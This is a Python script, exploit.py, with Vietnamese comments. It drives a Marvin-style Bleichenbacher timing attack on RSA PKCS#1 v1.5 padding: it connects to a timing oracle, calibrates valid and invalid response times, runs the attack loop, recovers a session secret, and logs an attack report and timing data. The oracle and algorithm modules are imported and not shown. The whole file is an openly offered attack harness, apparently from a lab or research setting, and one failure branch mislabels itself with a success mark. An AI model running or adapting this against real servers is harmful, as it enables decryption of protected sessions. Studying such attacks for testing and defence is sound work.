#!/usr/bin/env python3
# exploit.py

import time
import csv
import os
import utils
from oracle import TimeOracle
from algorithm import BleichenbacherAlgo

# --- Hàm ghi Log ---
def save_logs(folder, secret_hex, duration, query_count, valid_raw, invalid_raw):
    # Tạo folder nếu chưa có
    if not os.path.exists(folder):
        os.makedirs(folder)

    timestamp = int(time.time())

    # A. Ghi File Summary 
    summary_path = f"{folder}/attack_summary_{timestamp}.txt"
    with open(summary_path, "w") as f:
        f.write("=== MARVIN ATTACK REPORT ===\n")
        f.write(f"Status:       {'SUCCESS' if secret_hex else 'FAILED'}\n")
        f.write(f"Duration:     {duration:.2f} seconds\n")
        f.write(f"Total Queries:{query_count}\n")
        f.write(f"Recovered:    {secret_hex if secret_hex else 'N/A'}\n")
    
    # B. Ghi File CSV 
    csv_path = f"{folder}/timing_dist_{timestamp}.csv"
    with open(csv_path, "w", newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["type", "time"]) # Header
        # Ghi dữ liệu Invalid 
        for t in invalid_raw:
            writer.writerow(["invalid", t])
        # Ghi dữ liệu Valid
        for t in valid_raw:
            writer.writerow(["valid", t])

    print(f"[+] Logs saved to: {summary_path}")
    print(f"[+] Raw data saved to: {csv_path}")

# --- Main Exploit Logic ---
def main():
    oracle = TimeOracle()
    
    # Biến lưu dữ liệu để log
    valid_raw = []
    invalid_raw = []
    secret_hex = None
    start_time = 0
    end_time = 0

    try:
        oracle.connect()
        
        # Nhận dữ liệu thô từ hàm calibrate vừa sửa
        valid_raw, invalid_raw, med_v, med_i = oracle.calibrate()
        
        print("\n[*] Starting Attack Loop...")
        start_time = time.time()
        
        algo = BleichenbacherAlgo(oracle)
        m_int = algo.run() # Chạy tấn công
        
        end_time = time.time()

        if m_int:
            print("\n" + "="*40)
            
            secret = utils.extract_session_secret(m_int, oracle.k)
            if secret:
                print("[✓] ATTACK SUCCESSFUL!")
                secret_hex = secret.hex()
                print(f"    Recovered Secret (Hex): {secret_hex}")
            else:
                print("[✓] ATTACK FAILED!")
                secret_hex = f"INT_ONLY: {m_int}" # Trường hợp lấy được số nhưng parse lỗi
                print(f"    Recovered Message (Int): {m_int}")
            print("="*40 + "\n")
        else:
            print("\n[x] ATTACK FAILED.")
            end_time = time.time()

    except KeyboardInterrupt:
        print("\n[!] User interrupted.")
        end_time = time.time()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        end_time = time.time()
    finally:
        if start_time > 0: 
            duration = end_time - start_time
            save_logs(
                folder="../../logs/marvin-attack", # Thư mục lưu log
                secret_hex=secret_hex,
                duration=duration,
                query_count=oracle.query_count,
                valid_raw=valid_raw,
                invalid_raw=invalid_raw
            )
        
        oracle.close()

if __name__ == "__main__":
    main()